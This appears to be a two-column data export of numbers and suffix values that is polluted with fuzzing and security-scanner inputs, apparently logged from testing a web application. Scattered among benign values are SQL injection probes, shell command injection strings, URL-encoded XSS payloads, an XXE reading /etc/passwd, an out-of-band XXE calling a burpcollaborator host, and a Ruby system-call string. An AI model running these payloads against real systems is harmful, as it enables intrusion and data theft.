Number;Suffix;
75;"|echo 09ctv3136v c24q98m5o3 ||
938	
17	NULL
1	
1	NULL
501	
39	NULL
938	
71	NULL
938	
938	
25	NULL
42	
31	
24	NULL
68	NULL
2	NULL
938	-$1%2e00
3	
68	NULL
938	
1	NULL
10	
17	NULL
2	
19	NULL
2	NULL
938	
39	NULL
39	NULL
75	/nei/address
5	a
17	NULL
39	NULL
39	NULL
1	
26	A
10	
938	
501	NULL
34	a
938	
75	'(select*from(select(sleep(20)))a)'
20	NULL
34	a
938	
16	
75	
3	
150	NULL
3	NULL
6	
22	a
938	
251	NULL
39	NULL
938	
26	A
71	NULL
6	
68	NULL
75	
39	NULL
938	
75	
20	NULL
71	NULL
75,0)waitfor delay'0:0:20'--	
75	
20	
938	
73	
8	NULL
75	
25	NULL
8	NULL
938	
13	
17	NULL
1	NULL
938	%3ca%20href%3d%22%5cx0Ejavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e
10	NULL
938	%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cxA9javascript%3aalert(1)%3c%2fscript%3e
17	NULL
3	NULL
938	
68	NULL
71	NULL
8	NULL
938	
20	NULL
938	[%221%22,%7b%221%22%3a%220%22%7d]
938	
200	
11	
938	
938	
22	a
8	NULL
938	#
83	NULL
83	NULL
501	NULL
71	NULL
19	NULL
3	
3	NULL
75	
15	
3	NULL
1	NULL
938	-0
10	
13	NULL
71	NULL
1	
2	
116	
247	NULL
22	NULL
1	NULL
3	a
13	NULL
7	
501	NULL
2	NULL
71	NULL
80	NULL
938	 test 
10	
24	NULL
4	NULL
247	NULL
938	%7b%22_class%22%3a%22null%22,%22A%22%3a%22B%22%7d
938	
938	%3cimg%20src%3dx%5cx12onerror%3d%22javascript%3aalert(1)%22%3e
3	
24	NULL
39	NULL
71	NULL
10	
2	
938	
7	A
17	NULL
34	a
938	
938	
3	NULL
9	NULL
938	
212	NULL
938	
8	NULL
430	
7	A
19	NULL
938	
24	NULL
39	NULL
938	
150	NULL
22	
938	
75	
26	A
938	
3	NULL
2	NULL
11	
75	
19	NULL
1	
247	NULL
938	
938	
14	
1	
938	
247	NULL
75	
75	
75	NULL
1	NULL
938	
247	NULL
938	
75	' and 9276=9277-- 
27	NULL
75	
938	
24	NULL
150	NULL
4	NULL
3	
938	
34	a
42	
7	a
26	A
938	
75	
9	NULL
80	NULL
1	NULL
80	NULL
14	
1	NULL
938	%3cimg%5cx47src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e
938	
51	NULL
1	NULL
20	
1	NULL
417	
29	
39	NULL
938	
938	
2	NULL
11	
68	NULL
71	NULL
938	%3cimg%20src%5cx13%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e
938	
71	NULL
22	NULL
938	👩🏽
17	NULL
1	NULL
11	
938	
1	NULL
39	NULL
5	NULL
43	NULL
17	NULL
938	
17	
1	NULL
8	NULL
71	NULL
938	
24	NULL
1	NULL
4	NULL
938	田中さんにあげて下さい
25	NULL
24	NULL
32	NULL
34	a
1	NULL
8	
24	NULL
24	NULL
938	
645	
25	NULL
17	NULL
938	
938	
75	
13	B
26	A
20	
1	NULL
3	NULL
938	(%20͡°%20͜ʖ%20͡°)
938	
938	%3cimg%20%5cx00src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e
31	
1	NULL
22	NULL
39	NULL
938	
938	%3ca%20href%3d%22%5cx00javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e
1	NULL
75'|echo stgt2bqhfu l92no0hmxs #xzwx	
75	
71	NULL
923	
938	
4	NULL
938	
71	NULL
39	NULL
83	NULL
71	NULL
938	
19	NULL
938	
3	NULL
150	
26	A
4	NULL
75	
1	
19	
938	
2	NULL
938	
17	NULL
9	
17	NULL
5	b
39	NULL
938	
68	NULL
21	NULL
247	NULL
501	NULL
938	
247	NULL
3	T
247	NULL
70	
75	
0	
19	NULL
22	a
17	NULL
200	
83	NULL
25	NULL
1	NULL
21	
26	A
4	NULL
22	a
17	NULL
1	NULL
938	
938	
24	NULL
107	A
68	NULL
938	
938	#
938	
9	
938	%22%60'%3e%3cscript%3e%5cxC2%5cx85javascript%3aalert(1)%3c%2fscript%3e
938	Infinity
3	NULL
75	
123	D
75	
26	A
75	
2	NULL
71	NULL
19	NULL
938	
2	
3	NULL
50	
938	ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็%20ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็%20ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็
71	NULL
1	
76	A
26	A
1	NULL
7588112374 or 6357=63570-- 	
75	')waitfor delay'0:0:20'--
75	
150	NULL
938	eval(%22puts%20'hello%20world'%22)
39	NULL
2	NULL
938	
458	
938	
938	
1	NULL
938	
22	A
938	
75	
83	NULL
11	
3	NULL
22	NULL
2	NULL
501	
938	
938	
1	NULL
12	NULL
5	a
109	
938	
17	
938	
26	A
938	%3ca%20href%3d%22%5cx1Ejavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e
11	
8	NULL
938	
938	
71	NULL
938	
27	
7	A
39	NULL
938	%7b%220%22%3a[]%7d
938	
68	NULL
22	a
19	NULL
RMgDHLA2pzUNi5uGA69mKkuc29L5bo1d5a9DXJw12mk=	VZrq0IJk1XldOQlxjN0Fq9SVcuhP5VWQ7vMaiKCP3/0=
938	#
3	NULL
5	NULL
938	
938	
938	
26	A
22	NULL
34	a
150	NULL
22	A
7	A
200	
71	NULL
247	NULL
1	NULL
4	NULL
938	
1	NULL
1	NULL
3	NULL
9	NULL
19	NULL
7	
200	
212	NULL
34	a
2	NULL
75	
39	NULL
1	NULL
938	
2	
39	NULL
25	NULL
17	NULL
938	
9	
938	
938	
1	
31	NULL
938	
50	NULL
80	NULL
142	
49	b
938	
3	NULL
80	NULL
938	
75	
938	#	Japanese%20Emoticons
938	#	Strings%20which%20can%20cause%20user%20to%20pull%20in%20files%20that%20should%20not%20be%20a%20part%20of%20a%20web%20server
8	
68	NULL
58	
20	NULL
26	A
75	
65	
150	NULL
938	
24	NULL
71	NULL
34	a
200	NULL
80	NULL
83	NULL
938	1'000%2e00
2	NULL
3	NULL
7	
212	NULL
25	NULL
75'||(select extractvalue(xmltype('<?xml version=1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % dgpdx SYSTEM ""http://q900jmnorfmmdbiy81r9kbzqshybm2a6yylp9e.burpcollab'||'orator.net/"">%dgpdx;]>'),'/l') from dual)||'";
34;a;
8;NULL;
2;NULL;
938;;
71;NULL;
39;NULL;
3;NULL;
7;A;
50;NULL;
938;;
68;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
2;;
28;NULL;
1;NULL;
68;NULL;
18;;
1;X;
7;A;
43;;
938;＜script＞alert(123)＜%2fscript＞;
938;;
75;;
22;NULL;
10;;
150;;
938;⁰⁴⁵₀₁₂;
938;;
938;#;
24;NULL;
938;;
938;;
17;;
24;NULL;
22;a;
10;;
1;NULL;
938;#;Two-Byte%20Characters
1101;;
8;NULL;
938;;
71;NULL;
1;NULL;
71;NULL;
4;NULL;
39;NULL;
9;NULL;
TslZn8ID0XajAVNsLgkaGbyFJ1myVb1oGIEKQsX+0Uo=;;
501;NULL;
39;NULL;
71;NULL;
938;;
75;;
938;;
938;#;Strings%20which%20can%20cause%20user%20to%20run%20code%20on%20server%20as%20a%20privileged%20user%20(c%2ef%2e%20https%3a%2f%2fnews%2eycombinator%2ecom%2fitem%3fid%3d7665153)
13;NULL;
24;NULL;
16;;
39;NULL;
25;NULL;
938;%3c%3fxml%20version%3d%221%2e0%22%20encoding%3d%22ISO-8859-1%22%3f%3e%3c!DOCTYPE%20foo%20[%20%3c!ELEMENT%20foo%20ANY%20%3e%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%20%3e]%3e%3cfoo%3e%26xxe%3b%3c%2ffoo%3e;
76;;
51;NULL;
32;;
24;NULL;
10;;
68;NULL;
923;;
2;NULL;
1;NULL;
5;;
22;NULL;
9;NULL;
938;;
938;;
71;NULL;
24;NULL;
10;;
1;;
39;NULL;
938;;
9;;
212;NULL;
938;;
116;;
39;NULL;
64;;
938;;
24;NULL;
47;;
8;NULL;
75;;
39;NULL;
6;NULL;
412;;
10;NULL;
938;;
938;;
938;@%7b[system%20%22touch%20%2ftmp%2fblns%2efail%22]%7d;
938;;
938;;
5;NULL;
75;;
20;NULL;
938;;
12;NULL;
150;NULL;
34;a;
24;NULL;
938;;
938;;
938;;
71;NULL;
75;;
39;NULL;
75;;
10;;
65;NULL;
938;%3e%3cscript%3ealert(123)%3b%3c%2fscript%20x%3d;
75;;
8;;
938;;
41;NULL;
938;;
938;;
2;NULL;
8;NULL;
39;NULL;
150;NULL;
3;NULL;
75;;
7;NULL;
938;;
25;NULL;
7;A;
169;;
247;NULL;
87;;
938;;
39;NULL;
150;NULL;
938;%3ca%20href%3d%22javascript%5cx09%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
2;a;
938;;
938;;
121;;
1;NULL;
234;;
938;;
9;NULL;
113;;
938;;
1;NULL;
938;;
22;a;
42;;
7;A;
1;;
4;NULL;
24;NULL;
938;%3ca%20href%3d%22%5cx18javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;-1;
938;;
938;‪‪test‪;
1;NULL;
17;NULL;
75;;
938;%2e;
8;NULL;
75;;
71;NULL;
1;NULL;
938;#;
938;;
4;NULL;
938;;
26;A;
25;NULL;
4;NULL;
71;NULL;
938;;
75]]>><;;
1;;
37;;
75;;
938;;
938;;
80;NULL;
51;;
6;NULL;
68;NULL;
39;;
75;;
8;;
71;NULL;
4;NULL;
1;;
938;;
938;;
2;NULL;
212;NULL;
39;NULL;
938;;
39;NULL;
938;;
71;NULL;
6;;
501;;
17;NULL;
75;;
75;;
10;;
68;NULL;
3;NULL;
500;;
10;;
50;NULL;
34;a;
8;;
83;NULL;
938;;
4;NULL;
938;;
75;;
247;NULL;
2;;
2;NULL;
4;;
5;NULL;
4;NULL;
39;NULL;
15;NULL;
938;;
938;;
24;NULL;
72;;
57;;
7;A;
938;;
75;;
39;NULL;
3;;
938;;
938;;
938;basement;
938;👾%20🙇%20💁%20🙅%20🙆%20🙋%20🙎%20🙍;
7;A;
7;;
22;;
71;NULL;
24;NULL;
6;NULL;
24;NULL;
938;;
3;NULL;
938;;
71;NULL;
938;;
75;;
8;;
18;;
75;;
39;NULL;
938;;
938;;
29;;
73;;
1;NULL;
938;#;Strings%20which%20punish%20the%20fools%20who%20use%20cat%2ftype%20on%20this%20file
938;;
39;NULL;
24;NULL;
8;NULL;
17;;
150;NULL;
1;NULL;
938;;
501;NULL;
24;NULL;
24;NULL;
80;NULL;
938;;
39;NULL;
80;NULL;
938;;
39;NULL;
75;;
43;NULL;
938;;
938;1%20000%20000,00;
938;;
938;%7b%22Count%22%3a999999999999%7d;
938;;
19;NULL;
2;NULL;
938;;
25;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cx0Bexpression(javascript%3aalert(1)%22%3eDEF;
2;NULL;
938;%2b%2b%2bATH0;
17;NULL;
203;;
26;A;
150;NULL;
5;;
4;NULL;
22;a;
26;A;
83;NULL;
938;;
938;;
1;NULL;
4;NULL;
24;a;
39;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
7;;
5;NULL;
39;NULL;
66;;
3;NULL;
26;A;
14;;
1;;
17;NULL;
11;;
26;NULL;
75;;
3;;
938;;
11;;
938;;
24;NULL;
938;;
501;NULL;
938;%222012-04-21T18%3a25%3a43-05%3a00%22;
68;NULL;
9;NULL;
17;NULL;
12;;
8;NULL;
4;;
3;C;
9;NULL;
75;;
938;;
938;;
